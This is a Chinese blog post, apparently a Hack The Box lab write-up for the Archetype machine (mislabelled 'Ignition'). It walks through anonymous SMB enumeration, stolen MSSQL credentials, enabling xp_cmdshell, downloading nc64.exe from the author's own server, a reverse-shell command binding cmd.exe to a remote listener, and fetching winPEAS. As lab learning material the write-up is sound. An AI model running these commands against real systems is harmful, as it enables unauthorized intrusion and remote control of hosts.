@@ -1,0 +1,433 @@
+<!DOCTYPE html><html lang="zn-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Hack The Box-Ignition | </title><meta name="keywords" content="HackTheBox"><meta name="author" content="xxshh"><meta name="copyright" content="xxshh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Hack The Box-Ignition"><meta name="application-name" content="Hack The Box-Ignition"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Hack The Box-Ignition"><meta property="og:url" content="http://example.com/2024/12/17/Hack-The-Box-Archetype/index.html"><meta property="og:site_name" content=""><meta property="og:description" content="Introduction通过这篇博客，你会了解到 SMB 协议、smbclient 命令、Microsoft SQL Server 、Impacket工具、xp_cmdshell命令、winPEAS工具、windows权限提升等知识，并对 nmap 和反弹 shell 的使用更加娴熟。 Write-"><meta property="og:locale" content="zn-CN"><meta property="og:image" content="https://xxshh.github.io/images/%E9%BB%84.jpg?_r_=186c6211-ff71-fddc-81ac-f9e6d3c59b79"><meta property="article:author" content="xxshh"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://xxshh.github.io/images/%E9%BB%84.jpg?_r_=186c6211-ff71-fddc-81ac-f9e6d3c59b79"><meta name="description" content="Introduction通过这篇博客，你会了解到 SMB 协议、smbclient 命令、Microsoft SQL Server 、Impacket工具、xp_cmdshell命令、winPEAS工具、windows权限提升等知识，并对 nmap 和反弹 shell 的使用更加娴熟。 Write-"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2024/12/17/Hack-The-Box-Archetype/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: undefined,
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: false,
+  mainTone: undefined,
+  authorStatus: undefined,
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: xxshh","link":"链接: ","source":"来源: ","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: '',
+  title: 'Hack The Box-Ignition',
+  postAI: '',
+  pageFillDescription: 'Introduction, Write-up, Conclusion通过这篇博客你会了解到协议命令工具命令工具权限提升等知识并对和反弹的使用更加娴熟扫描目标主机端口我们发现端口是开放的并且正在端口上运行是一种网络文件共享协议常用于操作系统中用于允许应用程序读取和写入远程计算机上的文件以及请求计算机上的服务协议不仅支持文件共享还支持打印机共享网络浏览等功能主要通过端口进行通信使用与运行协议的远程服务器进行交互以匿名身份登录不需要密码列出目标主机上的所有共享资源明确指出你要访问的是网络共享而不是本地路径尝试访问输入命令列出当前目录中的文件和文件夹看起来像是一个配置文件使用命令将其下载到本地计算机文件内容如下我们发现了主机上用户的密码接下来尝试连接服务器工具中的可以提供此服务成功连接有关的渗透技巧可以看这篇文章默认情况下被禁用因为它允许执行操作系统命令这可能带来安全风险所以首先需要启用尝试下命令因为操作系统没有内置所以我们要想办法让它安装一个首先在本机下载并在端口开启一个注意把放在执行命令的目录下接下来在这边查看当前所处文件位置是的一个命令而不是中的命令表示启动作为用户没有权限在系统目录中上传文件根据对系统的了解可以在存放下载的文件接下来在这个文件夹下执行下载的命令由于对命令行工具的不熟悉这里一开始用的是命令后面无法执行反弹发现文件夹内没有改为命令后成功下载区别会根据自动保存文件可以使用参数指定保存的文件名默认输出内容到终端如果要将下载的文件保存到本地需要使用参数如果只是需要下载文件是更好的选择如果需要与服务器进行更复杂的交互发送请求处理表单数据上传文件等更适合在处看到目标服务器已经执行了这个命令接下来就是常规的反弹了本机开放端口监听目标服务器执行以下命令通过将绑定到我们的监听端口在用户的文件找到接下来需要找到管理员的涉及到权限提升可以利用工具搜索在主机上提升权限的可能路径将下载到目标服务器本机目标服务器首先执行然后执行命令这里尝试了和自带的都失败了错误提示这是因为在中默认使用作为内容解析引擎但在某些环境中可能不可用或没有完全配置这导致无法解析下载的内容以上版本通常不再依赖于引擎解决办法是使用参数让使用基本的解析方式而不是依赖引擎执行从输出的报告可以看到当前用户拥有权限这个权限可能被多汁土豆黑客技巧利用此处待日后展开讨论由于当前是一个普通用户账户同时也是一个服务账户为某些服务或应用程序运行而创建的账户因此值得检查一下是否有经常访问的文件或执行的命令在系统中会记录用户执行的命令历史类似于中的历史记录文件存储在目录下查看这个文件我们以明文形式获得了管理员用户的密码该密码为现在我们可以再次使用工具中的工具以管理员身份获取在管理员的文件找到这个靶场是目前三个里面花的时间最长的因为涉及到权限提升不仅要找到用户还要找到管理员实际上这个过程中并没有涉及到权限提升而是通过记录的文件找到了管理员的密码关于权限提升目前是一窍不通以后遇到相关靶场再详细记录通过三个靶场的练习一些重复的知识我已经完全掌握了这是一个良好的开端日后会坚持刷题的',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-12-17 20:00:55',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="" type="application/atom+xml">
+</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://xxshh.github.io/images/Avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title"></div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/12/"><span class="card-archive-list-date">December 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">10</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">November 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">October 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/09/"><span class="card-archive-list-date">September 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">August 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"><a class="article-meta__tags" href="/tags/HackTheBox/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>HackTheBox</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Hack The Box-Ignition</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-12-17T02:01:40.000Z" title="发表于 2024-12-17 10:01:40">2024-12-17</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-12-17T12:00:55.232Z" title="更新于 2024-12-17 20:00:55">2024-12-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="Hack The Box-Ignition"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为北京"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>北京</span></div></div></div><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2024/12/17/Hack-The-Box-Archetype/"><header><a href="/tags/HackTheBox/" tabindex="-1" itemprop="url">HackTheBox</a><h1 id="CrawlerTitle" itemprop="name headline">Hack The Box-Ignition</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">xxshh</span><time itemprop="dateCreated datePublished" datetime="2024-12-17T02:01:40.000Z" title="发表于 2024-12-17 10:01:40">2024-12-17</time><time itemprop="dateCreated datePublished" datetime="2024-12-17T12:00:55.232Z" title="更新于 2024-12-17 20:00:55">2024-12-17</time></header><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>通过这篇博客，你会了解到 SMB 协议、smbclient 命令、Microsoft SQL Server 、Impacket工具、xp_cmdshell命令、winPEAS工具、windows权限提升等知识，并对 nmap 和反弹 shell 的使用更加娴熟。</p>
+<h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><p>nmap 扫描目标主机端口：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241217101741.png"></p>
+<p>我们发现 SMB 端口是开放的，并且 Microsoft SQL Server 2017 正在端口 1433 上运行。</p>
+<ul>
+<li><strong>SMB</strong><ul>
+<li>SMB（Server Message Block）是一种网络文件共享协议，常用于 Windows 操作系统中，用于允许应用程序读取和写入远程计算机上的文件以及请求计算机上的服务。SMB 协议不仅支持文件共享，还支持打印机共享、网络浏览等功能。</li>
+<li>SMB 主要通过端口 <strong>445</strong> 进行通信。</li>
+</ul>
+</li>
+</ul>
+<p>使用 smbclient 与运行 SMB 协议的远程服务器进行交互：</p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">smbclient <span class="hljs-punctuation">-</span>N <span class="hljs-punctuation">-</span>L <span class="hljs-comment">//10.129.111.223</span><br><span class="hljs-meta">#-N : 以匿名身份登录，不需要密码。</span><br><span class="hljs-meta">#-L : 列出目标主机上的所有共享资源。</span><br><span class="hljs-meta"># `<span class="hljs-comment">//` 明确指出你要访问的是网络共享，而不是本地路径。</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241217105806.png"></p>
+<p>尝试访问 backups：</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">smbclient</span> //<span class="hljs-number">10.129.111.223</span>/backups<br></code></pre></td></tr></table></figure>
+
+<p>输入 dir 命令列出当前目录中的文件和文件夹：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241217110650.png"></p>
+<p> prod.dtsConfig 看起来像是一个配置文件。使用 get 命令将其下载到本地计算机：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241217110859.png"></p>
+<p>文件内容如下:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241217111114.png"></p>
+<p>我们发现了主机 ARCHETYPE 上用户 sql_svc 的密码。接下来尝试连接 MSSQL 服务器。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">Impacket</a>工具中的 <strong>mssqlclient.py</strong> 可以提供此服务：</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> mssqlclient.py ARCHETYPE/sql_svc@<span class="hljs-number">10.129.111.223</span> -windows-auth<br></code></pre></td></tr></table></figure>
+
+<p>成功连接Microsoft SQL Server：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241217123244.png"></p>
+<p>有关 MSSQL Server 的渗透技巧可以看这篇文章： <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server">https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server</a></p>
+<p>默认情况下，<code>xp_cmdshell</code> 被禁用，因为它允许执行操作系统命令，这可能带来安全风险。所以首先需要启用 <code>xp_cmdshell</code> ：</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-keyword">Check</span> <span class="hljs-keyword">if</span> xp_cmdshell <span class="hljs-keyword">is</span> enabled<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> sys.configurations <span class="hljs-keyword">WHERE</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>;<br><br># This turns <span class="hljs-keyword">on</span> advanced <span class="hljs-keyword">options</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">is</span> needed <span class="hljs-keyword">to</span> configure xp_cmdshell<br>sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span><br>RECONFIGURE<br><br><span class="hljs-meta">#This enables xp_cmdshell</span><br>sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span><br>RECONFIGURE<br></code></pre></td></tr></table></figure>
+
+<p>尝试下 whoami 命令：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241217125802.png"></p>
+<p>因为 windows 操作系统没有内置 netcat ，所以我们要想办法让它安装一个 nc 。</p>
+<p>首先在本机下载 nc64.exe，并在8000端口开启一个 http. server。注意把 nc64.exe放在执行 http. server 命令的目录下。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241217132634.png"></p>
+<p>接下来在 MSSQL Server 这边查看当前所处文件位置：</p>
+<figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey">EXEC xp_cmdshell <span class="hljs-string">&quot;powershell -c pwd&quot;</span><br># `pwd` 是 PowerShell 的一个命令，而不是 cmd.exe 中的命令。<br># `powershell -c` 表示启动 PowerShel<br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241217135009.png"></p>
+<p>作为用户 sql_svc ，没有权限在系统目录中上传文件。根据对 windows 系统的了解，可以在 <code>C:\Users\&lt;username&gt;\Downloads</code> 存放下载的文件。接下来在这个文件夹下，执行下载 nc64.exe 的命令：</p>
+<figure class="highlight hsp"><table><tr><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">EXEC</span> xp_cmdshell <span class="hljs-string">&quot;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.8:8000/nc64.exe&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>由于对命令行工具的不熟悉，这里一开始用的是 curl 命令。后面无法执行反弹 shell ，发现Downloads 文件夹内没有nc64.exe。改为 wget 命令后成功下载。</p>
+<ul>
+<li>区别：<ul>
+<li>**<code>wget</code>**：会根据 URL 自动保存文件。可以使用 <code>-O</code> 参数指定保存的文件名。</li>
+<li>**<code>curl</code>**：默认输出内容到终端，如果要将下载的文件保存到本地，需要使用 <code>-O</code>  参数。</li>
+<li>如果只是需要下载文件，**<code>wget</code>** 是更好的选择。</li>
+<li>如果需要与服务器进行更复杂的交互，发送 HTTP 请求、处理表单数据、上传文件等，**<code>curl</code>** 更适合。</li>
+</ul>
+</li>
+</ul>
+<p>在 http.server 处看到目标服务器已经执行了这个命令。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241217141433.png"></p>
+<p>接下来就是常规的反弹 shell 了。</p>
+<p>本机开放8888端口监听：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure>
+
+<p>目标服务器执行以下命令，通过 nc 将 cmd.exe 绑定到我们的监听端口：</p>
+<figure class="highlight dos"><table><tr><td class="code"><pre><code class="hljs dos">EXEC xp_cmdshell &quot;powershell -c <span class="hljs-built_in">cd</span> C:\Users\sql_svc\Downloads; .\nc64.exe -e <span class="hljs-built_in">cmd</span>.exe <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">8</span> <span class="hljs-number">8888</span>&quot;<br></code></pre></td></tr></table></figure>
+
+<p>在用户的 Desktop 文件找到 flag：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241217152043.png"></p>
+<p>接下来需要找到管理员的 flag，涉及到 Windows 权限提升，可以利用工具<a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe">winPEAS</a>，搜索在 Windows 主机上提升权限的可能路径。</p>
+<p>将 winPEASx64.exe 下载到目标服务器：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 本机：</span><br><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8000</span><br><br><span class="hljs-comment"># 目标服务器首先执行 PoweShell ，然后执行 wget 命令：</span><br><span class="hljs-attribute">powershell</span> <br><span class="hljs-attribute">Invoke</span>-WebRequest -Uri http://<span class="hljs-number">10.10.16.8:8000</span>/winPEASx64.exe -O <span class="hljs-string">&quot;winPEASx64.exe&quot;</span> -UseBasicParsing<br></code></pre></td></tr></table></figure>
+
+<p>这里尝试了 wget ，curl 和PowerShell 自带的 <code>Invoke-WebRequest</code>都失败了，错误提示：</p>
+<figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">wget : The response content cannot be parsed because <span class="hljs-keyword">the</span> Internet Explorer engine <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> available, <span class="hljs-keyword">or</span> Internet Explorer&#x27;s <span class="hljs-keyword">first</span>-<span class="hljs-built_in">launch</span> configuration <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> complete. Specify <span class="hljs-keyword">the</span> UseBasicParsing parameter <span class="hljs-keyword">and</span> <span class="hljs-keyword">try</span> again.<br></code></pre></td></tr></table></figure>
+
+<p>这是因为在 PowerShell 中，默认使用 Internet Explorer（IE）作为内容解析引擎，但在某些环境中，IE 可能不可用或没有完全配置。这导致无法解析下载的内容。PowerShell 7 以上版本通常不再依赖于 IE 引擎。</p>
